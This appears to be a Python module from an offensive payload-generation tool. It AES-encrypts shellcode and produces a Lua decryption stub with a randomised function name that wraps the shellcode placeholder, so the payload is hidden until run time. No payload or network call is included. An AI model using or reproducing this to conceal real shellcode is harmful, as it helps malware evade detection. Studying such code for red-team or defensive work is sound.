import os
from lua.utils.formatters import bytes_to_lua
from Crypto.Cipher import AES
from Crypto.Util import Padding
import string
import random

class AESEncrypt:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(32)
        if 'iv' in arguments:
            self.iv = arguments['iv'].encode()
        else:
            self.iv = os.urandom(16)

    def imports(self) -> list[str]:
        return ['local crypto = require "crypto"']

    def compilerOptions(self) -> list[str]:
        return ['-lcrypto']

    def encode(self, plaintext: bytes) -> bytes:
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        self.plaintextSize = len(plaintext)
        encrypted = cipher.encrypt(Padding.pad(plaintext, 16, style='pkcs7'))
        self.ciphertextSize = len(encrypted)
        return encrypted

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
function {self.name}(ciphertext)
    {bytes_to_lua(self.key, 'key')}
    {bytes_to_lua(self.iv, 'iv')}
    ciphertext = sys.Buffer(ciphertext)
    keyBuffer = sys.Buffer(key)
    ivBuffer = sys.Buffer(iv)
    local cipher = crypto.Cipher("aes256", keyBuffer, string.char(table.unpack(iv)), "cbc")
    local numbytes = cipher:decrypt(ciphertext)
    local plaintext = {{}}
    for i = 1, {self.plaintextSize}, 1 do
        plaintext[i] = cipher.decrypted[i]
    end
    return plaintext
end
"""